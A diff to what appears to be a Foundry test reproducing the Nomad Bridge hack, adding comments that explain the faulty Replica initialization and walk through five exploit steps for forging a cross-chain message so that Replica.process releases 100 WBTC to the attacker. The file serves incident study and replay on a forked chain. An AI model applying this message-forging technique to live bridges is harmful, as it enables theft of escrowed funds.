@@ -11,6 +11,17 @@ import "./../interface.sol";
 //  Attacker send 0.01 WBTC to NomadBridge : 0xed26708a7335116bdb0673f32ace7c2f329fe3cd349e200447210f1721f335f0
 //  NomadBridge Process 100 WBTC to Attacker : 0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460
 
+// VULNERABILITY: [ROOT CAUSE] Replica.initialize() was called (mistakenly) with a bad _committedRoot (listed as 0x53fd92... or effectively causing confirmAt[0]=1).
+// In Replica: committedRoot = _committedRoot; confirmAt[_committedRoot] = 1;
+// Because messages[leaf] defaults to bytes32(0) == LEGACY_STATUS_NONE for never-proven messages,
+// acceptableRoot(0) returned true (confirmAt[0] >=1 and ts ok).
+// Thus process() 's require(acceptableRoot(messages[_messageHash]), "!proven") PASSES for ARBITRARY messages without any Merkle proof or prior prove() call.
+// No check that the message leaf was ever inserted into a Home merkle tree or that the proof was validated against a Home-signed root.
+// This is the core enabler (see QSP-19 "Proving With An Empty Leaf" and the init of confirmAt[bad/zero]).
+// Downstream: any message with destination==localDomain and recipientAddress pointing to an enrolled remote router (BridgeRouter) is dispatched to .handle() which trusts it as a legitimate inbound transfer.
+
+// Impact: Attacker can drain any token held by the Nomad Bridge (WBTC, USDC, etc.) by faking inbound transfers. ~$152M lost.
+
 // @Info
 // Nomad BridgeRouter Contract : https://etherscan.io/address/0x88a69b4e698a4b090df6cf5bd7b2d47325ad30a3#code (Proxy)
 // Nomad BridgeRouter Contract : https://etherscan.io/address/0x15fda9f60310d09fea54e3c99d1197dff5107248#code (Logic)
@@ -40,6 +51,10 @@ contract Attacker is Test {
     }
 
     function testExploit() public {
+        // EXPLOIT STEP 1: Attacker monitors or replays a legitimate inbound Nomad message emitted by Home.dispatch on the remote domain.
+        // The full wire message format is: originDomain(4) || sender(32) || nonce(4) || destinationDomain(4) || recipientAddr(32) || body(BridgeMessage).
+        // Attacker does not need the merkle proof; the vuln makes proof unnecessary.
+
         console.log(
             "Attackers can copy the original user's transaction calldata and replacing the receive address with a personal one."
         );
@@ -47,6 +62,16 @@ contract Attacker is Test {
 
         emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
         console.log("Attacker claim 100 WBTC from NomadBridge...");
+
+        // EXPLOIT STEP 2: Rebuild a syntactically valid _message.
+        // - Keep the outer Nomad routing prefix (origin="beam", sender=remote BridgeRouter, nonce, dest="eth")
+        // - Set recipientAddress = BridgeRouter (so Replica will call it in handle)
+        // - Inside body: format TokenId(domain=eth, id=WBTC) + Action(Transfer(to=attacker, amnt=100e8, detailsHash))
+        // - Concatenate. The resulting bytes will hash to a never-before-seen leaf, so messages[keccak(_message)] == 0 .
+
+        // EXPLOIT STEP 3: Invoke Replica.process(_message) directly.
+        // VULNERABILITY TRIGGER: because confirmAt[0]==1 from bad init, acceptableRoot(0) == true, so the "!proven" require passes.
+        // Replica then does: IMessageRecipient(recipient).handle(origin, nonce, sender, body)  [the body is the BridgeMessage part] under only-replica auth from the caller's perspective (msg.sender==Replica in BridgeRouter's onlyReplica).
 
         // Copy inputdata in txhash(0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4a5460), but replacing receive address
         bytes memory msgP1 =
@@ -74,10 +99,19 @@ contract Attacker is Test {
             bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);
             -----------------------------------------------------------------------------
             bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);
+            // NOTE: keccak256(_message) produces a leaf that is NOT present in any Home merkle tree; under normal Replica this would require a valid proof to set messages[leaf].
         */
 
         bool suc = Replica.process(_message);
         require(suc, "Exploit failed");
+
+        // EXPLOIT STEP 4: Replica dispatches to BridgeRouter.handle(_origin, _nonce, _sender, _body).
+        // BridgeRouter (protected by onlyReplica + onlyRemoteRouter) parses the body as BridgeMessage:
+        //   tokenId + action(Transfer) --> _handleTransfer --> tokenRegistry.ensureLocalToken + IERC20(token).safeTransfer(attacker, amount)   [or mint for repr]
+        // Because the message was never actually sent from the Home on the source domain, this is creation of unbacked tokens / theft of escrowed tokens.
+        // No source-side burn/lock occurred for this particular message.
+
+        // EXPLOIT STEP 5: The transfer succeeds, attacker balance increases by the amount. The same technique works for any token the bridge holds liquidity for (by crafting or mutating real messages' token/amount/recipient). The attack can be repeated many times as the "proven" status for fake leaves isn't rate limited once 0 is acceptable.
 
         emit log_named_decimal_uint("Attacker WBTC Balance", WBTC.balanceOf(address(this)), 8);
     }
@@ -87,4 +121,6 @@ interface IReplica {
     function process(
         bytes memory _message
     ) external returns (bool _success);
+    // The real deployed Replica also exposes: committedRoot(), confirmAt(bytes32), messages(bytes32), prove(...)
+    // The vuln lives in how process() + acceptableRoot() interact with uninitialized entries in `messages`.
 }
